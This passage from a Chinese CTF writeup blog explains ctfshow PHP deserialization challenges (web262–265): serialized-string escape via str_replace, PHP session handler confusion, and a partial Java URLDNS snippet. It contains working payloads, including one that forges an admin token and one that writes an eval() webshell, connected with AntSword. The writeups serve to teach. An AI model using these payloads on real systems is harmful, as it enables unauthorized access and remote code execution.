class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://28bc736c-f956-4721-8651-efc6e2beb94a.challenge.ctf.show/&quot;</span>);  </span><br><span class="line">Class&lt;?&gt; c=url.getClass();  </span><br><span class="line">Field hashcode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">hashcode.set(url,<span class="number">1</span>);  </span><br><span class="line">HashMap&lt;URL,Integer&gt; h = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  </span><br><span class="line">h.put(url,<span class="number">1</span>);  </span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);  </span><br><span class="line">serialize(h);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow反序列化</title>
    <url>/2024/04/01/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>ctfshow 反序列化</p>
<span id="more"></span>

<h1 id="web262反序列化字符串增多逃逸"><a href="#web262反序列化字符串增多逃逸" class="headerlink" title="web262反序列化字符串增多逃逸"></a>web262反序列化字符串增多逃逸</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$food</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$food</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;food = <span class="variable">$food</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;suhuan&quot;</span>,<span class="string">&quot;shuiguo&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;suhuan&quot;;s:4:&quot;food&quot;;s:7:&quot;shuiguo&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:6:&quot;suhuan&quot;; //s: 指字符串string 6指字符串长度，suhuan 指name 的内容</span><br></pre></td></tr></table></figure>

<p>字符串长度为有效长度 ，若s 为8 则”; 也会成为name 的内容，也就是说通过修改字符串的有效长度，可以控制反序列化后的name 的内容， 当反序列化匹配到;} 就会截至反序列化。</p>
<p>然后我们</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="comment">//  需要的类的属性</span></span><br><span class="line"><span class="comment">//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:1:&quot;3&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line">实际上类的属性</span><br><span class="line"><span class="comment">//实际的类的属性</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];  <span class="comment">// 向construct传入三个参数</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>)); <span class="comment">// 这里将msg，赋值为加密后的序列化的类 </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>打开message.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$umsg &#x3D; str_replace(‘fuck’, ‘loveU’, serialize($msg));</p>
<p>四个字符变成五个字符  字符串增多逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<span class="comment">//此处有27个fuck=109+27=136</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:136:&quot;3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p> 然后以本人的解读，这里替换后为loveU，也就是 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:136:&quot;3loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>136 正好也就是3loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU的字符串长度，”;s:5:”token”;s:5:”admin”;} 将会成为有效位，由于;}  后面的将不会被解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;   // 一共27个字符，所以27 个fuck </span><br></pre></td></tr></table></figure>

<p>可以增多也就是吐出来有效字符</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>在index.php 传入参数后 在打开message.php 即被反序列化 进行echo flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸</span><br><span class="line">当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替</span><br></pre></td></tr></table></figure>

<h1 id="web263——session反序列化"><a href="#web263——session反序列化" class="headerlink" title="web263——session反序列化"></a>web263——session反序列化</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h2 id="session-工作原理"><a href="#session-工作原理" class="headerlink" title="session 工作原理"></a>session 工作原理</h2><p>当一个session第一次被启用时，一个唯一的标识被存储于本地的cookie中。</p>
<p>首先使用session_start()函数，PHP从session仓库中加载已经存储的session变量。</p>
<p>当执行PHP脚本时，通过使用session_register()函数注册session变量。</p>
<p>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.save_path指定，下次浏览网页时可以加载使用。</p>
<h2 id="session存储的方式"><a href="#session存储的方式" class="headerlink" title="session存储的方式"></a>session存储的方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_serialize  经过serialize()函数序列化数组</span><br><span class="line">php            键名+竖线+经过serialize()函数处理的值</span><br><span class="line">php_binary     键名的长度对应的ascii字符+键名+serialize()函数序列化的值</span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;meng&#x27;] = &#x27;meng&#x27;;</span><br></pre></td></tr></table></figure>

<p>结果为：meng|s:4:”meng”;  </p>
<p>键值 | 序列化处理的值</p>
<p>php.ini 下的session 的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path=&quot;&quot;  --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php </span><br></pre></td></tr></table></figure>

<p><a href="https://www.jb51.net/article/116246.htm">深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家 (jb51.net)</a></p>
<p><a href="https://www.cnblogs.com/meng-han/p/16851760.html">ctfshow web263(PHP的session反序列化漏洞) - hithub - 博客园 (cnblogs.com)</a></p>
<p>用dirsearch扫一下，发现<a href="http://www.zip文件,访问下载下来是网站源码./">www.zip文件，访问下载下来是网站源码。</a></p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	error_reporting(0);</span><br><span class="line">	session_start();</span><br><span class="line">	//超过5次禁止登陆</span><br><span class="line">	if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		 setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">		 $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>check.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require_once &#x27;inc/inc.php&#x27;;</span><br><span class="line">$GET = array(&quot;u&quot;=&gt;$_GET[&#x27;u&#x27;],&quot;pass&quot;=&gt;$_GET[&#x27;pass&#x27;]);</span><br><span class="line">if($GET)&#123;</span><br><span class="line"></span><br><span class="line">	$data= $db-&gt;get(&#x27;admin&#x27;,</span><br><span class="line">	[	&#x27;id&#x27;,</span><br><span class="line">		&#x27;UserName0&#x27;</span><br><span class="line">	],[</span><br><span class="line">		&quot;AND&quot;=&gt;[</span><br><span class="line">		&quot;UserName0[=]&quot;=&gt;$GET[&#x27;u&#x27;],</span><br><span class="line">		&quot;PassWord1[=]&quot;=&gt;$GET[&#x27;pass&#x27;] //密码必须为128位大小写字母+数字+特殊符号，防止爆破</span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	if($data[&#x27;id&#x27;])&#123;</span><br><span class="line">		//登陆成功取消次数累计</span><br><span class="line">		$_SESSION[&#x27;limit&#x27;]= 0;</span><br><span class="line">		echo json_encode(array(&quot;success&quot;,&quot;msg&quot;=&gt;&quot;欢迎您&quot;.$data[&#x27;UserName0&#x27;]));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		//登陆失败累计次数加1</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;])+1);</span><br><span class="line">		echo json_encode(array(&quot;error&quot;,&quot;msg&quot;=&gt;&quot;登陆失败&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);  <span class="comment">// 这里设置储存方式为php类型</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用点写入一个内容为$password的内容 </p>
<p>payload；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;);</span><br><span class="line">$res=&quot;|&quot;.serialize($user);</span><br><span class="line">echo urlencode(base64_encode($res));</span><br></pre></td></tr></table></figure>

<p>| 前面将会成为键值 ，|后面的将被反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQoK</span><br></pre></td></tr></table></figure>

<p>payload 使用方式</p>
<p>首先访问首页， 获得cookie ,同时建立session</p>
<p>  抓包改limit值为payload</p>
<p>访问check.php实现反序列化shell的写入</p>
<p>url&#x2F;log-1.php</p>
<p>蚁剑连接</p>
<h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;message.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>和道题和262 一摸一样，但是那道题是用cookie 这道题采用session 来保存值</p>
<p>payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>使用步骤</p>
<p>先在先在index .php 传入值</p>
<p>然后访问message.php 同时cookie传入 msg&#x3D;任意值</p>
<h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;<span class="comment">//使token=password 得return 1; echo flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 